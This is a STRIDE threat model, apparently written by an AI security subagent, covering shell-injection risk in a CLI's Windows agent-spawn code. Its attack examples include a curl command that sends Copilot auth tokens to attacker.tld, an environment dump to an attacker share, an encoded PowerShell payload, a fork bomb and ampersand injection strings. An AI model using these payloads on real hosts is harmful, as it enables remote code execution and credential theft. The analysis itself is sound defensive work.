# STRIDE Threat Model: `shell:IS_WINDOWS` + `copilotFlags.split(/\s+/)` Shell-Out

**Scope**: `packages/squad-cli/src/cli/commands/watch/agent-spawn.ts` (`spawnAgent` / `spawnWithTimeout`) and the shared `resolveCopilotCmd()` introduced by the #1372 fix.
**Trigger**: Any code path that invokes `execFile(copilotCmd, [...args], { shell: IS_WINDOWS, ... })` where `args` is derived from (a) external content (Teams/email body, GitHub issue body, file paths) **or** (b) operator-controlled `copilotFlags` env/CLI string passed through `.split(/\s+/)`.
**Platforms in scope**: Windows (where `shell: true` is in effect); Linux/macOS are tracked for parity but Node's argv-array path bypasses the shell.

---

## 1. Attack surface summary

| Sink | Trust of args | Shell on Win? | Direct command-injection? |
|---|---|---|---|
| `resolveCopilotCmd()` probe — `execFileSync(cmd, ['--version'], { shell: IS_WINDOWS })` | Static literal | Yes | **No** (args fixed) |
| `checkCopilotCli()` probe — `execFile(cmd, ['--version'], { shell: IS_WINDOWS })` | Static literal | Yes | **No** (args fixed) |
| `spawnAgent(prompt, copilotFlags)` — `execFile(cmd, [...flags, '-p', prompt], { shell: IS_WINDOWS })` | **Untrusted** (prompt = Teams/email/issue body; flags = operator env) | Yes | **YES on Windows** — args are concatenated with spaces by Node's `cmd.exe /d /s /c` wrapper without escaping `"`, `&`, `|`, `^`, `<`, `>`, `(`, `)`. |
| `monitor-teams.ts` / `monitor-email.ts` callers | Untrusted external content embedded into prompt | Yes (inherited) | **YES on Windows** |

The `--version` probe sites are clean. The agent-spawn sites are the live exposure. `shell:true` causes Node to pass the entire argv as a single string to `cmd.exe /d /s /c "<cmd> <arg0> <arg1> ..."` with no quoting applied to the arg array — by design, per Node docs and security advisories (see CVE-2024-27980 family).

---

## 2. STRIDE per element

### S — Spoofing
- **S1 (PATH-hijack co-trigger)**: An attacker who can write to any directory earlier on PATH than the real `copilot.cmd` location can spoof the Copilot CLI identity. With `shell:true` on Windows, `cmd.exe` resolves the command via PATHEXT, so a planted `copilot.bat`/`copilot.cmd`/`copilot.com` wins before the genuine `copilot.cmd`. See `path-hijack-risk.md`.
- **S2 (Sender spoofing)**: Teams/email integrations already authenticate the channel, but the *content* is attacker-controlled (any user can DM the bot). Spoofing the *content origin* is trivial and is the precondition for every injection below.

### T — Tampering
- **T1 (Argument tampering via prompt)**: Untrusted prompt body containing `" & calc.exe & echo "` becomes `cmd.exe /d /s /c "copilot -p " & calc.exe & echo ""` on Windows. The `&` separator terminates the copilot invocation and starts `calc.exe`. **Severity: HIGH (RCE on agent host).**
- **T2 (copilotFlags injection)**: `SQUAD_COPILOT_FLAGS="--foo & rundll32 ..."` set in env or CI matrix — splits to `['--foo', '&', 'rundll32', '...']` and the `&` becomes a shell separator under `shell:true`. **Severity: MEDIUM (requires env access, but env is often dumped to logs / inherited from build configs).**
- **T3 (PowerShell variant)**: If `process.env.ComSpec` is overridden to `powershell.exe`, the injection grammar changes (`;`, `|`, backtick-newline, subexpressions `$(…)`). Same root cause.

### R — Repudiation
- **R1**: Spawned child processes inherit the parent's stdio. Injected commands write to the agent's stdout/stderr, which is captured into squad logs. *Helpful* for forensics but does not constitute non-repudiation — log integrity is not enforced.

### I — Information Disclosure
- **I1 (Data exfiltration via injected command)**: `& curl -F file=@%USERPROFILE%\.copilot\hosts.json https://attacker.tld &` exfiltrates Copilot auth tokens. **Severity: CRITICAL.**
- **I2 (Env leakage)**: Injected `& set > \\attacker\share\env.txt &` dumps the full environment, including `GITHUB_TOKEN`, `AZURE_*`, and other secrets present in agent runtimes.

### D — Denial of Service
- **D1 (Fork bomb)**: Injected payload `& cmd /c "%0|%0" &` triggers fork-bomb behavior. The 5-second `--version` timeout does NOT apply to the agent spawn path (no timeout there today).
- **D2 (Resource exhaustion via flag tampering)**: `--max-tokens 999999999` style flags can be smuggled via `copilotFlags` split, exhausting Copilot quota.

### E — Elevation of Privilege
- **E1 (Local privilege escalation)**: When the squad runtime runs as a service account (e.g., scheduled task, systemd-on-WSL bridge, GitHub-hosted Windows runner), injected commands inherit those privileges. On self-hosted Windows runners, this often means `NT AUTHORITY\SYSTEM` or a dedicated runner account with repo-write GH PAT.
- **E2 (Cross-tenant via Teams)**: A Teams external user can post into a channel the bot monitors. If the bot's host has access to repo secrets, the external user effectively achieves RCE in the secrets' trust boundary. **This is the realistic worst case.**

---

## 3. Attack trees

### AT-1: External user → RCE on Windows agent host (via Teams monitor)
```
Goal: Arbitrary code execution as squad-bot service account
└── 1. Send Teams message in monitored channel/chat
    ├── 1a. Message body: 'hi" & powershell -enc <base64> & rem "'
    │   └── monitor-teams.ts embeds body into prompt
    │       └── spawnAgent(prompt, flags) → execFile(cmd, [..., '-p', prompt], {shell:true})
    │           └── cmd.exe parses prompt; `&` terminates copilot; powershell runs ✓ RCE
    ├── 1b. Variant: file:// URI in body → triggers `copilot read <url>` → same surface
    └── 1c. Mention-bait: '@squad-bot please run "evil & cmd"' (social engineering)
```

### AT-2: Operator → RCE via copilotFlags
```
Goal: Lateral movement / persistence as squad runtime
└── 1. Influence SQUAD_COPILOT_FLAGS env var
    ├── 1a. Compromised CI variable / GitHub secret update
    ├── 1b. Repo .env.example committed with hostile default
    └── 1c. PR adds .github/workflows/*.yml with `env: SQUAD_COPILOT_FLAGS: "..."`
        └── split(/\s+/) → array with `&`, `;`, `|` tokens
            └── shell:true joins them → RCE
```

### AT-3: PATH hijack co-trigger
```
Goal: Spoof Copilot CLI to capture prompts
└── 1. Plant `copilot.cmd` in any user-writable PATH dir (e.g. C:\Users\<u>\AppData\Local\Programs\…)
    └── 2. resolveCopilotCmd() probes via shell:true → finds attacker copy first
        └── 3. attacker .cmd writes every prompt+arg to disk / network
            └── Cross-references: I1, I2; see path-hijack-risk.md
```

---

## 4. Severity reassessment

| Finding | Pre-fix | Post-#1372-fix | After spawn hardening | Notes |
|---|---|---|---|---|
| `--version` probe injection | N/A (no taint) | **None** | None | Static args; safe. |
| `spawnAgent` prompt injection | **HIGH** (RCE) | **HIGH** (unchanged — fix only covered probes) | **None** (after dropping `shell:true`) | Live exposure today. |
| `copilotFlags` split injection | **MEDIUM** | **MEDIUM** | **LOW** (residual: flag-validation only) | Even without shell, flags should be validated against an allow-list. |
| PATH hijack of Copilot CLI | **MEDIUM** | **MEDIUM** | **LOW** (with absolute-path resolution) | See `path-hijack-risk.md`. |

**Net: the #1372 preflight fix is safe but does NOT close the injection finding.** Required follow-on (tracked by `spawn-agent-shell-injection.test.ts` regression guard already on `main` @ `b9c6982`):

1. **Drop `shell:true` from `spawnAgent`/`spawnWithTimeout`.** Use the absolute resolved path from `resolveCopilotCmd()` so PATHEXT lookup is unnecessary.
2. **Validate `copilotFlags`** against an allow-list (`/^--?[a-z][a-z0-9-]*$/i` for keys; values are kept as separate array slots).
3. **Add 30s timeout + 1MB stdout cap** on agent spawns to bound D1/D2.
4. **Add semgrep guard** (see `static-rules-rationale.md`) to block reintroduction.

---

## 5. Decision

- **Approve #1372 preflight patch** for landing (probes are clean).
- **Open follow-on tracking item** for spawn-side hardening; treat as **HIGH** severity, fix-forward.
- **Block any future PR** that adds `shell: true` or `shell: IS_WINDOWS` to a spawn site whose args contain a non-literal token — enforced via `.semgrep/squad-spawn-rules.yml`.

— security-hardening-squad, threat-model subagent
